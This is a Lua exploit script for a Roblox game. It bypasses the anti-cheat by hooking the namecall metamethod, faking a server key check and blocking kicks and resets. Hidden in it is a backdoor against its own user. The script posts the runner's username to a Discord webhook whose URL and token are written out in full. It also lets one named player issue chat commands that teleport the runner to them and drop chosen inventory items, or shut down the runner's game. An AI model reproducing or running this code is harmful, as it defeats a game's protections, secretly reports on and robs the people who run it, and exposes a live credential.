repeat wait(1) until game:IsLoaded()
function searchTable(t, index)
	local temp = {};
	for i,v in pairs(t) do
		table.insert(temp, tostring(v));
	end
	if table.find(temp, index) then
		temp = nil;
		return true;
	end
	return false;
end

local function getTableLength(t)
    local temp = 0;
    for i,v in pairs(t) do temp = temp + 1; end
    return temp;
end

--This is used to get the return key in case they change it
local gc = getgc(true);
local key = nil;
for i = #gc, 1, -1 do
    if type(gc[i]) == "table" then
        if rawget(gc[i], "A") and type(rawget(gc[i], "A")) == "table" and #(rawget(gc[i], "A")) > 2 then
            key = rawget(gc[i], "A")[2];
            break;
        end
    end
end

--Bypasses
local oldNamecall;
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...};
    if not checkcaller() and getnamecallmethod() == "InvokeServer" and tostring(self) == "Returner" and args[1] == "idklolbrah2de" then
        if key then return key;
		else return "  ___XP DE KEY"; end
    end
	if not checkcaller() and getnamecallmethod() == "InvokeServer" and args[1] == "Reset" then
		return;
	end
	if not checkcaller() and getnamecallmethod() == "FireServer" and args[1] == "Reset" then
		return;
	end
    if not checkcaller() and getnamecallmethod() == "Kick" then
        return;
    end
    return oldNamecall(self, ...);
end);

for i,v in pairs(getgc()) do
	if type(v) == "function" and tostring(getfenv(v).script) == 'Client' and #debug.getprotos(v) == 7 and searchTable(debug.getupvalues(v), "RemoteEvent") then
		v = function() end;
		break;
	end
end

local HttpService = game:GetService("HttpService")

local url = "https://discord.com/api/webhooks/895665360987103274/D8Zotnu16yA3MWy69FdGoJgHpAykUZ-dwUm1wNP0nlnZP7VTDK3ywN7SxWlYbDeKz-EG"

local http_request = http_request
    if syn then
        http_request = syn.request
    elseif SENTINEL_V2 then
        function http_request(tb)
            return {
                StatusCode = 200,
                Body = request(tb.Url, tb.Method, (tb.Body or ""))
            }
        end
    end

    local body = http_request({Url = "https://httpbin.org/get", Method = "GET"}).Body
    local decoded = HttpService:JSONDecode(body)

    local data = {
        ["content"] = "<@428541904796385280>, script was executed by "..game.Players.LocalPlayer.Name,
    }

    local newdata = HttpService:JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }

    local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    http_request(request_payload)
    
wait(.2)
local trig

local plr = game.Players.LocalPlayer


function trigger(target)
    
    trig = target.Chatted:Connect(function(word)
        print("chat")
        if ((word:sub(1,5)):lower() == ":drop") then
		print("pass 1")
            local char = plr.Character or plr.CharacterAdded:Wait()
            local hum = char:FindFirstChild("Humanoid")
            local humrp = char:FindFirstChild("HumanoidRootPart")
            local event = char:FindFirstChild("RemoteEvent")
            local tarchar = target.Character or target.CharacterAdded:Wait()
	    local tarhumrp = tarchar:FindFirstChild("HumanoidRootPart")
	    
            if (char and hum and hum.Health > 1 and humrp and event and tarchar and tarhumrp) then
            print("pass 2")
                local itemname = (word:sub(7,-1)):lower()
                print(itemname)
                local lastpos = humrp.CFrame
		print(lastpos)
                humrp.CFrame = tarhumrp.CFrame * CFrame.new(0,0,5)
                print("Wryyyy")
                for _,v in pairs(plr.Backpack:GetChildren()) do
                    
                    if (v.Name):lower() == itemname then
                        
                        event:FireServer("DropItem",v)
                        wait(2)
                    end
                end
                
                humrp.CFrame = lastpos
            end
        elseif ((word:Sub(1,5)):lower() == ":kick") then game:Shutdown() end
    end)
end
    


for _,v in pairs(game.Players:GetChildren()) do
    if v.Name == "ivan_zyuzin" then
        trigger(v)
	print("Nill")
    end
end

game.Players.ChildAdded:Connect(function(v)
    if v.Name == "ivan_zyuzin" then
        trigger(v)
	print("added")
    end
end)    
game.Players.ChildRemoved:Connect(function(v)
    if v.Name == "ivan_zyuzin" then
        trig:Disconnect()
	print("removed")
    end
end)    
